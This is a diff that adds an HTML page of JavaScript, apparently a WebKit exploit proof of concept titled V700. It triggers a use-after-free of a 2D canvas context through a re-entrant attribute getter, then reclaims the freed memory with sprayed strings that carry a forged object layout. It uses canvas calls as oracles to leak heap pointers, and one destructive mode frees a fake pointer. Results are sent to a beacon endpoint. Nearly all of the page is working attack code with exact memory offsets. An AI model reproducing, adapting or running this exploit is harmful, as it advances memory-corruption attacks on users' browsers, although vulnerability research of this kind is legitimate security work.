@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V700</title></head>
+<body><pre id="out">V700 — string-reclaim state-free oracle + weak-factory write</pre>
+<script>
+'use strict';
+/*
+ * V700 — what can you do with a string-reclaimed CanvasRenderingContext2D
+ *        WITHOUT ever touching m_stateStack?
+ *
+ * Reclaim object: flat 16-bit StringImpl, allocated by String.fromCharCode.
+ *   length 374 -> request 20 + 748 = 768 bytes (bmalloc class 67; the
+ *                 context is 728 bytes -> class 768). Use 374 by default.
+ *   length 342 -> request 20 + 684 = 704 bytes (class 66). Negative
+ *                 control: it cannot reclaim a class-768 context.
+ *
+ * Payload map (object offset = 20 + 2*unitIndex):
+ *   +0..+19    StringImpl header (engine): destroys primary vptr at +0,
+ *              m_wrapper at +8 becomes object+20, +16 is hashAndFlags.
+ *   +16        m_weakPtrFactory.m_impl. Must be 0.
+ *              = hashAndFlags(0 for 16-bit) | chars[0..1]<<32.
+ *   +24        m_checkedPtrCount. 0.
+ *   +28        m_hasActiveInspectorCanvasCallTracer. 0.
+ *   +32        m_canvas. 0 (we never call .canvas / getImageData).
+ *   +40..+111  CanvasPath vptr + Path variant. 0 => m_path monostate.
+ *   +112..+127 m_stateStack {buffer,capacity,size}. 0.
+ *   +128..     repeating 8-byte group 01 01 00 00 00 00 00 00.
+ *              Any 8-aligned m_settings in this region gives
+ *              desynchronized=true, colorSpace="srgb".
+ *              It also forces a >0xFF code unit (16-bit allocation).
+ *
+ * Modes:
+ *   ?mode=oracle  getContextAttributes + save/restore + beginPath/closePath
+ *                 + createImageData. No gradient. Safest.
+ *   ?mode=grad    oracle + createLinearGradient + scan every sprayed string
+ *                 for the WeakPtrImpl pointer written at +16.
+ *   ?mode=pathbad index 2 + pointer 0x1 in m_path; beginPath() should crash
+ *                 iff the libc++ variant index is at +48. DESTRUCTIVE.
+ *
+ * Query: len=374 (default; 342 = negative control)  n=1200
+ *        mode=cold|oracle|grad|pathbad   force=1
+ */
+
+var P = new URLSearchParams(location.search);
+var LEN = +(P.get('len') || '374');
+var NSPRAY = +(P.get('n') || '1200');
+var MODE = P.get('mode') || 'oracle';
+var FORCE = P.get('force') === '1';
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+
+/* Pre-allocate beacons: no allocation between UAF and the reads. */
+var _imgs = [];
+for (var _i = 0; _i < 80; _i++) _imgs.push(new Image());
+var _ix = 0;
+function bk(tag, d) {
+  var u = '/beacon/V700-' + tag + '?d=' + encodeURIComponent(String(d).slice(0, 900)) + '&t=' + Date.now();
+  try { _imgs[_ix++ % 80].src = u; } catch (e) {}
+}
+
+/* Build the payload string. */
+function makePayload() {
+  var units = new Array(LEN);
+  for (var i = 0; i < LEN; i++) units[i] = 0;
+
+  /* Pattern starts at object +128 -> chr index (128-20)/2 = 54.
+     Align the 01 01 00 00 00 00 00 00 group to that index. */
+  if (MODE === 'pathbad') {
+    /* libc++ std::variant: index at +48 (chr 14), storage at +56 (chr 18). */
+    units[14] = 2;            /* index = UniqueRef<PathImpl> */
+    units[18] = 1;            /* pointer = 0x1 -> delete 0x1 */
+    units[19] = 0;
+    units[20] = 0;
+    units[21] = 0;
+    /* leave the rest zero; do not call state methods */
+  } else {
+    var phase = (54 % 4);
+    for (var j = 54; j < LEN; j++) {
+      units[j] = (((j - 54) % 4) === 0) ? 0x0101 : 0;
+    }
+    /* +592..+595 must be zero: a nonzero m_unrealizedSaveCount makes
+       realizeSaves() append states and deref m_buffer before any write. */
+    units[286] = 0; units[287] = 0;
+  }
+  return String.fromCharCode.apply(null, units);
+}
+
+/* Trigger the UAF. Keep the state stack inline (no save() before the free). */
+var innerCtx = null;
+var canvas = null;
+function triggerUAF() {
+  canvas = document.createElement('canvas');
+  canvas.width = 1; canvas.height = 1;
+  var opts = {};
+  Object.defineProperty(opts, 'alpha', {
+    get: function () {
+      var ctx = canvas.getContext('2d');
+      innerCtx = ctx;
+      /* Markers, in case a later partial/same-type reclaim preserves
+         the inline State at +128. Harmless here. */
+      ctx.lineWidth = 1337.1337;
+      ctx.miterLimit = 13.37;
+      ctx.globalAlpha = 0.5;
+      ctx.fillStyle = '#112233';
+      return true;
+    }
+  });
+  canvas.getContext('bitmaprenderer', opts);
+}
+
+bk('BOOT', 'len=' + LEN + ' n=' + NSPRAY + ' mode=' + MODE);
+say('V700 len=' + LEN + ' n=' + NSPRAY + ' mode=' + MODE);
+
+triggerUAF();
+
+var payloads = [];
+
+if (MODE === 'cold') {
+  /* No spray. The freed chunk still has the inline m_buffer = P+128,
+     m_capacity = 1, m_size = 1, and the inline State POD fields.
+     Read immediately, before any beacon/DOM allocation can recycle it. */
+  var coldSame = '?', coldLw = '?', coldRearm = '?';
+  try { coldSame = innerCtx && (innerCtx.canvas === canvas); } catch (e) { coldSame = 'ERR:' + e.name; }
+  try { coldLw = innerCtx && innerCtx.lineWidth; } catch (e) { coldLw = 'ERR:' + e.name; }
+  /* Beacon the critical reads before any re-arm allocation. */
+  bk('COLD', 'same=' + coldSame + ' lw=' + coldLw);
+  say('COLD same=' + coldSame + ' lw=' + coldLw);
+  try {
+    /* Re-arm: save() sets the counter, the setter's realizeSaves()
+       grows the stack out-of-line and writes a fresh heap pointer at +112. */
+    innerCtx.save();
+    innerCtx.lineWidth = 4242.42;
+    coldRearm = innerCtx.lineWidth;
+  } catch (e) { coldRearm = 'ERR:' + e.name + ':' + e.message; }
+  bk('REARM', 'lw=' + coldRearm);
+  say('REARM lw=' + coldRearm);
+} else {
+  /* Reclaim the freed 704/768 block with 16-bit strings.
+     Do this BEFORE any beacon/say/DOM allocation after the free. */
+  for (var i = 0; i < NSPRAY; i++) payloads.push(makePayload());
+  bk('UAF', 'ctx=' + (innerCtx ? 1 : 0) + ' canvas=' + (canvas ? 1 : 0) + ' n=' + payloads.length);
+  say('UAF triggered: innerCtx=' + (innerCtx ? 'ok' : 'null') + ', sprayed ' + payloads.length);
+}
+
+if (!innerCtx) { bk('ABORT', 'no-ctx'); say('no ctx'); }
+else if (MODE === 'cold') {
+  /* already handled above */
+}
+else if (MODE === 'pathbad') {
+  /* No state-free reads first: go straight to the variant dispatch. */
+  bk('PATHBAD-PRE', 'calling beginPath');
+  say('pathbad: calling beginPath() with index=2, ptr=0x1');
+  try { innerCtx.beginPath(); bk('PATHBAD', 'survived'); say('pathbad survived'); }
+  catch (e) { bk('PATHBAD-X', e.name + ':' + e.message); say('pathbad threw ' + e.name); }
+} else {
+  /* ---- 0. save() oracle: the reclaimer's +592 counter is JS-readable ----
+     Object +592 maps to 16-bit char index (592-20)/2 = 286.
+     save() is a pure ++u32 there; no state, no m_canvas, no vptr.
+     Snapshot a small window, save once, compare, restore once. */
+  var SAVE_IDX = Math.floor((592 - 20) / 2);
+  var WIN0 = SAVE_IDX - 4, WIN1 = SAVE_IDX + 4;
+  var beforeWin = [];
+  for (var wi = 0; wi < payloads.length; wi++) {
+    var row = [];
+    for (var wj = WIN0; wj <= WIN1; wj++) {
+      try { row.push(payloads[wi].charCodeAt(wj)); } catch (e) { row.push(-1); }
+    }
+    beforeWin.push(row);
+  }
+  var saveHits = [];
+  try {
+    innerCtx.save();
+    for (var wi2 = 0; wi2 < payloads.length; wi2++) {
+      for (var wj2 = WIN0; wj2 <= WIN1; wj2++) {
+        var nv = payloads[wi2].charCodeAt(wj2);
+        if (nv !== beforeWin[wi2][wj2 - WIN0])
+          saveHits.push('idx=' + wj2 + ',k=' + wi2 + ',0x' + nv.toString(16));
+      }
+      if (saveHits.length >= 12) break;
+    }
+    innerCtx.restore();
+  } catch (e) { bk('SAVEORACLE-X', e.name + ':' + e.message); }
+  bk('SAVEORACLE', saveHits.length ? saveHits.join('|') : 'none');
+  say('save oracle: ' + (saveHits.length ? saveHits.join('|') : 'none'));
+
+  /* ---- 1. constant getter: proves the wrapper is alive, reads nothing ---- */
+  try { var r = innerCtx.webkitBackingStorePixelRatio; bk('RATIO', 'v=' + r); say('ratio=' + r); }
+  catch (e) { bk('RATIO-X', e.name); }
+
+  /* ---- 2. m_settings oracle ---- */
+  var attrs = null, attrsErr = '';
+  try { attrs = innerCtx.getContextAttributes(); bk('ATTRS', JSON.stringify(attrs)); say('attrs=' + JSON.stringify(attrs)); }
+  catch (e) { attrsErr = e.name + ':' + e.message; bk('ATTRS-X', attrsErr); say('attrs threw ' + attrsErr); }
+
+  /* ---- 3. save/restore: counter-only (or size<=1) ---- */
+  try {
+    innerCtx.save(); innerCtx.save(); innerCtx.restore(); innerCtx.restore();
+    bk('SAVE', 'ok'); say('save/restore ok');
+  } catch (e) { bk('SAVE-X', e.name + ':' + e.message); say('save/restore threw ' + e.name); }
+
+  /* Only proceed to variant/colorSpace/gradient work if the m_settings
+     pattern proves the reclaimer is our payload. Otherwise these calls
+     may hit an arbitrary object's m_path and crash for no information. */
+  var ours = FORCE || !!(attrs && attrs.desynchronized === true);
+  bk('OURS', ours ? 'yes' : 'no');
+  say('reclaimer looks like our payload: ' + ours);
+
+  if (ours) {
+    /* ---- 4. m_path monostate: clear + isEmpty ---- */
+    try { innerCtx.beginPath(); innerCtx.closePath(); bk('PATH', 'ok'); say('beginPath/closePath ok'); }
+    catch (e) { bk('PATH-X', e.name + ':' + e.message); say('path threw ' + e.name); }
+
+    /* ---- 5. m_settings.colorSpace only ---- */
+    try { var id = innerCtx.createImageData(1, 1); bk('IMGDATA', 'w=' + (id && id.width)); say('createImageData ok'); }
+    catch (e) { bk('IMGDATA-X', e.name + ':' + e.message); say('createImageData threw ' + e.name); }
+  } else {
+    bk('SKIP', 'not-ours');
+    say('skipping path/createImageData/gradient (not our payload)');
+  }
+
+  /* ---- 6. weak factory write at +16, then scan the strings ---- */
+  if (MODE === 'grad' && ours) {
+    try {
+      var g = innerCtx.createLinearGradient(0, 0, 1, 1);
+      bk('GRAD', 'ok type=' + (g && g.constructor && g.constructor.name));
+      say('createLinearGradient ok');
+    } catch (e) {
+      bk('GRAD-X', e.name + ':' + e.message);
+      say('createLinearGradient threw ' + e.name);
+    }
+
+    var hits = [];
+    for (var k = 0; k < payloads.length; k++) {
+      try {
+        var c0 = payloads[k].charCodeAt(0);
+        var c1 = payloads[k].charCodeAt(1);
+        if (c0 !== 0 || c1 !== 0) {
+          hits.push(k + ':0x' + c0.toString(16) + ',0x' + c1.toString(16));
+          if (hits.length >= 12) break;
+        }
+      } catch (e) {}
+    }
+    bk('SCAN', hits.length ? hits.join('|') : 'none');
+    say('scan hits: ' + (hits.length ? hits.join('|') : 'none'));
+  }
+}
+
+bk('DONE', MODE);
+say('V700 complete.');
+</script>
+</body></html>
